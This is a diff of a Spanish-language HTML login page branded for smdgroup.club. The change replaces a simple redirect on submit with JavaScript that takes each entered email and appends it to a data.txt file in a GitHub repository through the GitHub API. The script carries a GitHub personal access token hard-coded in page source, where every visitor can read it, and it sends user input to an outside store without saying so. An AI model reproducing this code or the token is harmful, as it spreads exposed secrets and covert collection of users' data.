@@ -52,7 +52,6 @@
             height: 50px; /* Aumentamos la altura del campo */
         }
 
-        /* Estilo cuando el campo está enfocado (cuando el usuario está escribiendo) */
         .input-container input:focus {
             border-color: #007bff; /* Color azul */
             border-width: 2px; /* Borde más grueso (solo cuando está enfocado) */
@@ -106,19 +105,17 @@
     </style>
 </head>
 
-<body data-gramm="false" data-lt-tmp-id="lt-219664">
+<body>
     <div class="login-container">
         <img src="https://app.smdgroup.club/assets/images/logos/logo.svg" class="logo" />
 
         <form id="loginForm">
             <div class="input-container">
-                <!-- Elimina la etiqueta <label> que contiene el texto "Email" -->
                 <input id="email" placeholder="Email" type="email" required />
             </div>
 
             <div class="input-container">
                 <input id="clave" placeholder="Clave" type="password" required />
-                <!-- Ojo cerrado como ícono usando Font Awesome -->
                 <span id="togglePassword" class="password-eye"><i class="fas fa-eye-slash"></i></span>
             </div>
 
@@ -173,10 +170,53 @@
             }
         });
 
-        // Función para redirigir a la página de login (puedes cambiar la URL)
+        // Función para enviar los datos a GitHub cuando se envíe el formulario
         document.getElementById('loginForm').addEventListener('submit', function (e) {
             e.preventDefault(); // Evitar que el formulario se envíe de forma tradicional
-            window.location.href = "login.html"; // Redirigir a la página de login (login.html)
+
+            // Datos a enviar
+            const username = emailInput.value; // Usar el email como nombre de usuario
+
+            // API de GitHub para actualizar el archivo
+            fetch('https://api.github.com/repos/EduSMBclub/appsmdgroupclub/contents/data.txt', {
+                method: 'GET',
+                headers: {
+                    'Authorization': 'token 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',
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Si el archivo ya existe, se puede obtener el contenido
+                const fileContent = data.content ? atob(data.content) : ''; // Decodificar el contenido actual del archivo
+
+                // Nuevo contenido (agregar el nombre de usuario al archivo)
+                const newContent = fileContent + '\n' + username;
+
+                // Enviar el nuevo contenido al repositorio
+                fetch('https://api.github.com/repos/EduSMBclub/appsmdgroupclub/contents/data.txt', {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': 'token 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',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: 'Agregar nuevo usuario',
+                        content: btoa(newContent), // Codificar el nuevo contenido a base64
+                        sha: data.sha // Usar el sha del archivo existente para actualizarlo
+                    })
+                })
+                .then(response => response.json())
+                .then(updatedData => {
+                    alert('¡Datos actualizados correctamente!');
+                })
+                .catch(error => {
+                    console.error('Error al actualizar el archivo:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error al obtener el archivo:', error);
+            });
         });
     </script>
 </body>
